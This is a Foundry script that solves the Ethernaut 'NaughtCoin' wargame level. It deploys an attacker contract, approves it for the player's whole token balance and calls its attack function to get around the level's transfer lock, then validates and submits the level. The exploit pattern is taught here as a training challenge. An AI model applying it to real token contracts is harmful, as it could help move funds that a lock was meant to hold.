// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./NaughtCoin.sol";
import "./NaughtCoinAttacker.sol";

contract NaughtCoinSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        NaughtCoin instance = NaughtCoin(getLevelInstanceFromEntry(Levels.naughtcoin, 2));
        NaughtCoinAttacker attacker = new NaughtCoinAttacker(address(instance));

        instance.approve(address(attacker), instance.balanceOf(msg.sender));
        attacker.attack();

        require(validateLevelInstance(Levels.naughtcoin, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
